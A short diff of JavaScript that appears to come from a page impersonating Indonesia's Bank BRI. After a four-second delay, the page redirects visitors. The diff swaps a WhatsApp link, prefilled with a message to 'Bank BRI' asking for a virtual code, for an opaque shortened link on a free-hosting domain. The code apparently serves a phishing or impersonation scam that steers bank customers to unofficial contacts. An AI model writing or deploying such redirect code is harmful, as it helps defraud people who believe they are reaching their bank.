@@ -131,7 +131,7 @@ function getcs(){
    audio1.load();   
 setTimeout(function(){  
     $("#process1").hide();   
-location.href='https://wa.me/62817310927?text=Hallo%20Bank%20BRI%0ASaya%20mau%20Request%20kode%20Virtual';
+location.href='https://kuda-terbang.whf.bz/urlwa/b7gg11';
  $('.load').hide();
     }, 4000);    
     
